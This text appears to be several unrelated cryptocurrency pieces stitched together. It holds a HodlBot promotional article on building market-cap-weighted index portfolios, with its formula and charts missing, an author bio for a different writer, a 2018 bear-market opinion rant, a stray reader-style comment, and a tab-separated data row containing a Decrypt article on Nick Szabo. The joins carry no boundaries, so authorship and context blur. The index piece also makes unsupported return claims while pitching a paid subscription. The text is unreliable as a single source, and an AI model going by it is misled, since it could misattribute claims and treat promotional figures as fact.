
In my opinion, most investors don’t benefit from taking on unsystematic risk. If you’re confident about the crypto market, then it is wiser to bet your money on the entire cryptocurrency market rather than test your luck picking individual coins.

The performance of “the market” is the capitalization-weighted average of the performance of all the investors in the market. Therefore, if some traders outperform, the others must underperform.

Most active traders don’t realize how difficult it is to consistently beat the market. Over the last 15-year period, 95% of active funds failed to beat index funds.

It becomes even harder to beat the market after we take into account all the time spent doing research(opportunity cost), transaction costs incurred while trading, and traders who are kicking your ass by breaking the rules.

Constructing a Total Market Index

The ideal index consists of every single coin in the market, weighted by market cap. Unfortunately, creating such a portfolio is infeasible because of minimum trading amounts and trading fees. The only option left is to take a sample.

In principle, the larger the sample, the more accurate it will be in tracking the overall market. But as the sample grows larger, the more difficult and costly it is to maintain.

Most indices take the top N coins by market capitalization because the top coins capture a higher % of the total market cap.

But if we simply weighted the top 20 coins by market cap, we would end up with a portfolio that is extremely top-heavy. The index wouldn’t do a great job at capturing the risk & performance of the lower-capped coins.

Bitcoin makes up almost 60% of the entire portfolio, while ranks 15–20 make up only 3.4% of the portfolio.

The HODL20 Index

The HODL20 was our first attempt to index the market. We made it available to all investors, without any account minimums or % management fees.

For the HODL20, we took the top 20 coins and assigned each coin a % allocation based on their weighted market capitalization.

Then we capped every coin to be at most 10% of the total portfolio value. Anything above 10% gets redistributed to all the coins below 10% until the entire sum of the portfolio adds up to 100%.

HODL 20 Allocation as of March 25, 2018. Head over to HodlBot to get started for free.

The HODL 20 makes up ~87% of the cryptocurrency market. For comparison, the S&P 500 represents ~75% of the US stock market.

Over a 3 year period, Bitcoin was up by a factor of 42x. HODL20 with no rebalancing was up a factor of 51x and the HODL20 with monthly rebalancing was up a factor of 164x.

A rebalance every 4 weeks incurred 0.26% in annual transaction costs.

Downsides with Caps

While caps are commonly used across traditional equity indices, it is not the only method to weigh lower-capped coins higher.

Placing a 10% cap on each coin, often maxed out each of the 5 highest ranking coins. To me, this didn’t always make sense.

For example, BTC’s market cap is ~20x higher than the 5th highest ranking coin. To equally weigh both in the HODL20 seems a bit suspicious.

Introducing the HODL30

The HODL30 is a 30 coin index that uses a different indexing methodology. The top 30 coins capture ~92% of the total market cap.

This index was inspired by our friends over at CCI30, whose work we greatly admire.

Smoothing Market Capitalizations

We noticed with the HODL20 that raw market capitalizations are quite volatile and can move back and forth a lot on a daily basis.

In order to smooth it, we’re going to take the exponentially weighted moving average.

where M(t) is the actual market cap at time t, M* is our adjusted market cap, i is the number of days away from the current date, and α is fixed constant.

To calculate the smoothed market cap for any particular day, we’re going to take the weighted sum of market caps going back into the past, where the weightings gets smaller and smaller the further back we go.

As i becomes larger, the weighting approaches 0.

Smoothed market capitalization for Bitcoin

As an example, we’re going to take the exponentially weighted moving average market cap for BTC.

As we decrease α, we get a smoother line. For our index, we’ve decided to take 0.3 for α.

Taking the Square Root of the Smoothed Market Capitalization

Once we have a smoothed market capitalization for each coin, we take the square root of each adjusted coin’s market cap.

This shifts some of the weightings from the highest capped coins towards the lower-capped coins. However, it still keeps a difference in weighting between differently ranked coins.

The HODL10

Since a 10% cap wouldn’t make any sense for a 10 coin portfolio, we’ve also decided to use the same methodology for the HODL10.

Users should use the HODL10 over the HODL30 if they have a much smaller portfolio, say <$200. Since there are minimum trading limits on Binance, a portfolio of $50–100 would not be suited for the HODL20 or HODL30.

Correlation Analysis

To quickly visualize how well the HODL indices track the market, we’re going to overlay the indices’ returns over the total cryptocurrency market cap graph.

To compare the data in way that makes sense, we’re going to normalize the starting point for total market cap as well as the indices at 1.

At a glance it looks like the returns from some of the top 30 coins end up outperforming the market. Continued multiplicative effects can cause some large discrepancies.

To see how tightly correlated the HODL indices are with the rest of the market, we’re going to compute the Pearson’s correlation coefficient as well.

Voila, it looks like both the HODL10 and HODL30 are tightly coupled with the overall market’s performance.

Available to All Investors

We’ve made these indices available to everyone on HodlBot. All you need to get started is a Binance, Bittrex, Kraken, or KuCoin account.

Our goal is to democratize investing for everyday people, so we’ve made our price point affordable with paid subscriptions starting at $3/month. It’s free to try for the first 7 days.

Creating these new indices was just the tip of the iceberg for us. We’re building a platform that can automate any trading strategy.

A consultant to travel and blockchain companies, he's following both industries closely and writing about them. Follow him on trondbjoroy.com and LinkedIn .

I’ll admit it, this prolonged cryptocurrency bear market that we’re in has got me feeling down. A year ago I was enormously bullish on everything blockchain and cryptocurrency, and I still am, but 2018 has given me a mild distaste for the whole space.

The market’s continuous, slow bleed throughout the year definitely has to take some blame for that, but I believe it’s mostly due to following the space closely. I can’t help noticing all the growing pains that this industry is currently going through, and it’s difficult not to take everything in.

Bad actors everywhere

I’m tired of bad ICOs with dead GitHub repos, fake partnerships, announcements of announcements to come (hey, Justin), and ‘utility’ tokens whose only utility is being tradable on a shady exchange (on which a sizable portion of the ICO funds was spent to get listed in the first place).

Spend more time building the product that you promised already, creating some real-world use cases for your token, and less time planning your next pump and dump scheme and eventual exit scam.

I’m sick of having shitcoins airdropped to my Ethereum wallet. It looks like a mess now with countless ERC20 tokens that I never asked for, have absolutely no idea where came from or what function they hold. Most of them will never get listed anywhere anyway and forever be valued at zero.

While airdrops used to sound like a promising token distribution concept to me, the influx of crappy projects doing one has given them the same ring as the old Nigerian prince email spam. At least you could delete an email, it’s not like it was forever stuck in a block on some chain you know.

Good times

Spamming leads me to bounty hunters, the princes’ heir and next-gen masters of unsolicited investment advice, who in their tireless hunt for tokens create multi-channel buzz, or, if you prefer, mindless and mostly incomprehensible noise, about a project.

If you’ve visited a blockchain project’s Telegram group lately, or you’re connected to a bounty hunter on LinkedIn, you’ve seen their messages. They’re all like “I think this project is the best and I believe in the team this will go to the moooon”.

Someone needs to research the actual ROI of running a bounty campaign. It’s mind boggling to me how anyone can think this is good PR. Professional spammer should not be a valid career path so can we all please agree to raise the bar a little?

Good PR, much?

A community falling apart

I’m also close to joining the thousands of others who’ve left crypto-Twitter lately. Salt level here is growing at a disproportionate rate to cryptocurrency prices, with maximalists from different camps fighting about why their coin and protocol can be the only winner, and traders picking random fights and making fun of each other’s regularly failing predictions and technical analysis.

There should and will always be a competitional element in a space with new tech and money involved, but this bear market is taking the bickering to new heights and really causing people to get on each other’s nerves.

To progress, we need more collaboration and to be more supportive of each other. Be nicer. Try harder. We are people of similar mind and passion and we should be like family (not talking to all you scammers and fraudsters out there. I don’t want to be related to you).

Talking about family, at least we have them and our friends to support us in these difficult times, right? Well, if you convinced your friends to buy Bitcoin or Ether last December you probably don’t have many left, and if you didn’t, well, be thankful you still have friends, even if they’ve likely turned into compassionless monsters taking great pleasure in your pain by now.

Smart money? Am I it?

To further add to the miserable state of the market, there is the never-ending stream of timely, seemingly coordinated, FUD attacks. Whenever the market looks to be slightly recovering, you can always count on media to push some story about a new alleged scam, fraud, hack or cryptocurrency ban, causing more retail investors to panic sell their Bitcoin and leave the market.

This will go on until there are no weak hands left, and the smart money has accumulated enough for them to stop suppressing prices and kick off a new bull run. I’ve come to accept that as long as we’re in an unregulated space we just have to play along with whatever the whales’ current narrative is.

What really bothers me is the poor state of crypto-journalism, both from mainstream and industry media. The general coverage is really below par and fake news is kinda the norm. And sometimes, all it takes is a misquote from someone prominent in the space to trigger a sell-off.

I will keep speculation to myself as to whether this is due to agendas or just a general lack of understanding of the space, but outlets should step up their game and also take responsibility for contributing to last year’s hype and causing regular people to lose their life savings.

Counter trading CNBC reportedly has a 95 percent success rate. On the other hand, if you’ve been following their advice you’re likely rekt by now.

Begone, foul bears!

Surely there must be reasons for optimism, to hang in there? Of course, this is just me being a drama queen, let’s look at what lies ahead.

It’s unclear which market phase cryptocurrencies are in right now — personally I think capitulation is close — but we’re definitely in a weird phase.

Although the original concept was for us to manage our own money, we’re beginning to realize that’s not really what most people want, at least they don’t know it yet, so now there’s a trend where everyone wants government and institutional help and regulation to manage it for us so we can have mass adoption. It’s really contradictory.

Now, I’m not sure whether ETFs being approved, Bakkt launching, Nasdaq and big banks opening up for cryptocurrency trading will be good for the space long term (in terms of prices it probably won’t), but I’m certain we’ll see short and mid term price pumps as each of these perceived bullish milestones is reached.

While no one knows for certain if the bottom is near, we should focus less on vanity metrics like price, and remember why we joined this space in the first place (reminder: it’s because we think it can change the world).

This space has the most developer activity out there, by far. Look at the quality projects that are launching. Look at all the infrastructure and UX being built.

Ben Horowitz, co-founder and general partner of venture capital firm Andreessen Horowitz, in a recent interview referred to blockchain as a new computing platform. First we had the mainframes, he said, then the PCs and the mobile phones, and they all brought along some new capabilities, but now comes blockchain and it’s the first platform to enable trust as a feature.

Once this sinks in, and you remember the potential that lies in not having to trust the government or any other centralized entity any longer, that’s when the bear market is just a distant memory and you become woke. Suddenly, Bitcoin becoming the native currency of the internet, and the world reserve currency, seems obvious.

So forget short term, keep on building, learn to filter out the noise, and you’ll be fine. Oh, and counter trade CNBC.

Tim Draper predicts the crypto market to be at 80 trillion in 10-15 years.

Also remember how much money is printed every year by all currencies in the world.

That alone will likely be a increase of 80 trillion in 10-15 years"
2018-09-27 19:37:00+00:00	Nick Szabo: ‘Blockchains need armour, not fins’	['Decrypt', 'Tim Copeland']	"Recently, a “next-generation” blockchain called Red Belly hit a mean 30,000 transactions-per-second (TPS). Bitcoin can manage seven. Is it game over?



Not according to Nick Szabo, a blockchain pioneer who invented smart contracts and Bit Gold, a precursor to Bitcoin, and, some believe, Bitcoin, too. Either way, he has a bone to pick with the Young Turks of the industry who believe they can offer faster, more scalable blockchains. “Foolish” he calls them, in an address which claims that the real value of bitcoin lies not in its speed but in something he calls: social scalability.



Speaking at this year’s Blockchain Live, in London, Szabo defended the proof-of-work consensus mechanism that bitcoin uses, which has been criticized for having a penchant for vast amounts of energy. He acknowledged that other cryptocurrencies have created faster, more scalable systems but said that this did not account for human nature.



Szabo said: “We’ve had some people saying we can improve the TPS or we’re going to be inspired by blockchain but not use a true blockchain. If you need trust, and global seamlessness, that’s a very penny wise and foolish approach.”



He began his speech like any self-respecting cypherpunk would: by talking about Communism. In this particular ditty, he explored the equal distribution of resources, and proclaimed communism works when there’s just a few people, but fails because “trust scales poorly.” In essence, a large-scale system in any human environment needs to work without relying on trust.



“If you look at the way attacks have happened in bitcoin, trusted strangers are security holes. Bitcoin is decentralized, almost hack proof. The vast majority of hacks have been on centralized exchanges that people use to trade.”



He described the inefficiency of bitcoin as a sacrifice in order to work in a trustless, global environment. “Secure, permissionless blockchains need armour not fins,” said Szabo, arguing that proof-of-work helps to secure the network making it more secure against human nature and that this is more important than speed.

He previously blogged on this subject back in 2017 on his site called Unenumerated. Just as you might expect, instead of articles you can breeze through in a cinch, Szabo’s site is full of long, dense meditations on all things blockchain that take hours to wade through. At least he’s a man of his word."
